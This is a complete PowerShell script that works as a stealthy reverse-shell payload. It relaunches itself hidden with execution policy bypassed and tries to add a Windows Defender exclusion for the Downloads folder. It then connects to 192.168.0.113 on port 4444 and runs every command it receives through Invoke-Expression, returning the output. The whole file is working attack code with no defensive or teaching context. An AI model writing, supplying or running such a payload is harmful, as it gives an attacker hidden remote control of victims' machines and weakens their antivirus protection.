# --- Get current script path reliably ---
$scriptPath = $PSCommandPath
if (-not $scriptPath) {
    $scriptPath = $MyInvocation.MyCommand.Path
}

# --- Relaunch in hidden window if not already hidden ---
if (-not ([System.Diagnostics.Process]::GetCurrentProcess().StartInfo.WindowStyle -eq 'Hidden')) {
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`"$scriptPath`""
    Start-Sleep -Milliseconds 500  # Let child start before parent exits
    return
}

# --- Ensure it's Windows PowerShell (not Core) ---
if ($PSVersionTable.PSEdition -ne 'Desktop') {
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`"$scriptPath`""
    Start-Sleep -Milliseconds 500
    return
}

try {
    # Attempt Defender exclusion (silently fails if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Reverse shell ===
    $client = "192.168.0.113"
    $port = 4444

    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    Write-Error "Execution failed: $_"
}
